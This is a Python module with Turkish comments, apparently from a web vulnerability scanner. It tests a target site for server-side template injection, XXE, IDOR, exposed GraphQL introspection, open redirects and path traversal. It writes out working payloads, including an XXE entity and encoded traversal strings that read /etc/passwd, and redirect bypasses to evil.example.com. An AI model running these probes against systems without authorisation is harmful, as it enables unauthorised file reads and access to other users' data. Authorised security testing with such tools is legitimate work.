#!/usr/bin/env python3
"""
Maxima Cog: Yeni Saldırı Vektörleri — SSTI, XXE, IDOR, GraphQL
FIX:
  - IDOR: her 200 yanıtı değil; içerik/boyut farkı + erişim kontrolü sinyali arıyor
  - XXE: "XML işleniyor" false-positive azaltıldı — gerçek hata veya dosya içeriği zorunlu
  - SSTI: math sonucu tam eşleşme, kısmi match kabul edilmiyor
  - Open redirect: hedef sitenin host'una ait olmayan yönlendirmeler raporlanıyor
"""
import sys, os, re, json, urllib.parse
from utils.base_module import BaseModule, ModuleResult


class NewAttackVectors(BaseModule):
    """SSTI + XXE + IDOR + GraphQL — false-positive azaltılmış"""

    def run(self) -> ModuleResult:
        self.log("Yeni saldırı vektörleri taranıyor...")
        self._test_ssti()
        self._test_xxe()
        self._test_idor()
        self._test_graphql()
        self._test_open_redirect_deep()
        self._test_path_traversal()
        return self.results

    # ── SSTI ─────────────────────────────────────────────────
    def _test_ssti(self):
        self.log("SSTI testi...", "info")
        # Unique marker ile yanlış eşleşmeyi önle
        probes = [
            ("{{SSTI_A*SSTI_B}}".replace("SSTI_A","7").replace("SSTI_B","7"),
             "49", "Jinja2/Twig"),
            ("${7*7}",         "49", "FreeMarker/Velocity"),
            ("#{7*7}",         "49", "Ruby ERB"),
            ("*{7*7}",         "49", "Spring Expression"),
            ("<%= 7*7 %>",     "49", "ERB/ASP"),
            ("{{7*'7'}}",      "7777777", "Jinja2 string multiply"),
        ]
        params = self._get_test_params()
        for param in params[:4]:
            baseline = self.http_get(self._inject_param(param, "SSTI_BASELINE_TEST"))
            baseline_body = baseline.get("body", "")

            for payload, expected, engine in probes:
                url  = self._inject_param(param, payload)
                resp = self.http_get(url)
                body = resp.get("body", "")

                # expected değeri body'de tam olarak geçiyor VE baseline'da geçmiyor
                if (expected in body and
                        expected not in baseline_body and
                        payload not in body):  # payload ham yansıdıysa template işlenmemiş
                    self.add_finding(
                        f"SSTI Tespit Edildi — {engine}",
                        f"Param: {param} | '{payload}' → '{expected}' | Motor: {engine}",
                        "critical"
                    )

    # ── XXE ──────────────────────────────────────────────────
    def _test_xxe(self):
        self.log("XXE testi...", "info")
        passwd_payload = (
            '<?xml version="1.0"?><!DOCTYPE foo '
            '[<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<root>&xxe;</root>'
        )
        indicators = ["root:x:", "root:0:0", "daemon:", "nobody:"]

        xml_paths = ["/api", "/api/v1", "/ws", "/soap", "/xmlrpc.php",
                     "/api/xml", "/service", "/upload"]

        for path in xml_paths:
            url  = self.url.rstrip("/") + path
            resp = self.http_get(url)
            code = resp.get("status", 0)
            if code not in (200, 201, 405, 415):
                continue

            r = self.http_post(url, passwd_payload.encode(),
                               {"Content-Type": "application/xml"})
            body = r.get("body", "")

            # Gerçek dosya içeriği geri döndü mü?
            if any(ind in body for ind in indicators):
                self.add_finding(
                    "XXE — /etc/passwd Okundu",
                    f"Path: {path} | İçerik: {body[:120]}",
                    "critical"
                )
            elif r.get("status", 0) not in (200, 201, 400, 422):
                pass  # Yoktur veya metoddur
            # FIX: "xml işleniyor olabilir" gibi belirsiz bulguyu kaldırdık

    # ── IDOR ─────────────────────────────────────────────────
    def _test_idor(self):
        """
        FIX: Her iki endpoint da 200 döndürüyor OLMASI YETMEZ.
        İçerik anlamlı ölçüde farklı olmalı VE küçük ID değişimi
        farklı kaynak döndürmeli (gerçek erişim kontrolü yok sinyali).
        """
        self.log("IDOR testi...", "info")
        idor_patterns = [
            "/user/{id}", "/account/{id}", "/profile/{id}",
            "/api/user/{id}", "/api/v1/user/{id}",
            "/order/{id}", "/invoice/{id}", "/document/{id}",
        ]
        for pattern in idor_patterns:
            url1  = self.url.rstrip("/") + pattern.replace("{id}", "1")
            resp1 = self.http_get(url1)
            if resp1.get("status", 0) != 200:
                continue
            body1 = resp1.get("body", "")
            if len(body1) < 100:  # Boş veya hata sayfası
                continue

            vulnerable = False
            for test_id in ("2", "3", "0"):
                url2  = self.url.rstrip("/") + pattern.replace("{id}", test_id)
                resp2 = self.http_get(url2)
                if resp2.get("status", 0) != 200:
                    continue
                body2 = resp2.get("body", "")

                # İçerik FARKLI mı VE anlamlı boyutta mı?
                if len(body2) < 100:
                    continue
                # Çok benzer içerik (aynı hata sayfası gibi) — false positive
                similarity = len(set(body1.split()) & set(body2.split())) / \
                             max(len(set(body1.split())), 1)
                if similarity < 0.85 and len(body2) > 100:
                    self.add_finding(
                        f"Olası IDOR: {pattern.replace('{id}','')}",
                        f"id=1 ve id={test_id} farklı içerik döndü (benzerlik: "
                        f"{similarity*100:.0f}%) — erişim kontrolü eksik olabilir",
                        "high"
                    )
                    vulnerable = True
                    break
            if vulnerable:
                break

    # ── GraphQL ──────────────────────────────────────────────
    def _test_graphql(self):
        self.log("GraphQL introspection testi...", "info")
        graphql_paths = ["/graphql", "/api/graphql", "/gql", "/graph",
                         "/api/graph", "/v1/graphql"]
        query = json.dumps({"query": "{ __schema { types { name kind } } }"}).encode()

        for path in graphql_paths:
            url  = self.url.rstrip("/") + path
            resp = self.http_post(url, query, {"Content-Type": "application/json"})
            body = resp.get("body", "")
            code = resp.get("status", 0)

            if code == 200 and "__schema" in body:
                try:
                    data  = json.loads(body)
                    types = data.get("data", {}).get("__schema", {}).get("types", [])
                    names = [t["name"] for t in types if not t["name"].startswith("__")]
                    self.add_finding(
                        "GraphQL Introspection Açık",
                        f"Path: {path} | {len(names)} tip: {', '.join(names[:8])}",
                        "high"
                    )
                except Exception:
                    self.add_finding("GraphQL Endpoint Aktif",
                                     f"{path} introspection yanıtladı", "medium")

            elif code in (400, 422):
                # Endpoint var ama introspection kapalı — sadece bilgi
                resp_body = resp.get("body", "").lower()
                if "introspection" in resp_body or "graphql" in resp_body:
                    self.add_finding(
                        "GraphQL Endpoint (Introspection Kısıtlı)",
                        f"Path: {path} HTTP {code}", "low"
                    )

    # ── Open Redirect (Derin) ────────────────────────────────
    def _test_open_redirect_deep(self):
        self.log("Open Redirect derin testi...", "info")
        params = ["redirect","url","next","return","goto","dest",
                  "destination","rurl","target","redirect_uri","return_url"]
        evil   = "https://evil.example.com"
        bypasses = [
            evil,
            "//" + "evil.example.com",
            f"https://{self.host}@evil.example.com",
        ]
        for param in params:
            for bypass in bypasses:
                url  = f"{self.url}?{param}={urllib.parse.quote(bypass)}"
                resp = self.http_get(url, follow_redirects=False)
                loc  = (resp.get("headers", {}).get("location", "") or
                        resp.get("headers", {}).get("Location", ""))
                if loc and "evil.example.com" in loc and self.host not in loc:
                    self.add_finding(
                        f"Open Redirect: ?{param}",
                        f"Yönlendirme: {loc[:80]} | Bypass: {bypass[:50]}",
                        "high"
                    )
                    break

    # ── Path Traversal ───────────────────────────────────────
    def _test_path_traversal(self):
        self.log("Path traversal testi...", "info")
        traversals = [
            "../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
        ]
        file_params = ["file","path","page","template","include",
                       "doc","document","pdf","img","image","load"]
        indicators  = ["root:x:","root:0:0","[boot loader]",
                       "for 16-bit app","# /etc/fstab"]

        for param in file_params:
            for trav in traversals:
                url  = f"{self.url}?{param}={urllib.parse.quote(trav)}"
                resp = self.http_get(url)
                body = resp.get("body", "")
                if any(ind in body for ind in indicators):
                    self.add_finding(
                        f"Path Traversal — Dosya Okuma: ?{param}",
                        f"Payload: {trav} | İçerik: {body[:80]}",
                        "critical"
                    )
                    return  # Yeterli kanıt

    # ── Helpers ──────────────────────────────────────────────
    def _get_test_params(self):
        parsed = urllib.parse.urlparse(self.url)
        params = [k for k, _ in urllib.parse.parse_qsl(parsed.query)]
        return params or ["q","search","name","id","input","data","template"]

    def _inject_param(self, param, payload):
        parsed = urllib.parse.urlparse(self.url)
        qs = dict(urllib.parse.parse_qsl(parsed.query))
        qs[param] = payload
        new_qs = urllib.parse.urlencode(qs)
        if parsed.query:
            return self.url.replace(parsed.query, new_qs)
        return self.url + "?" + new_qs
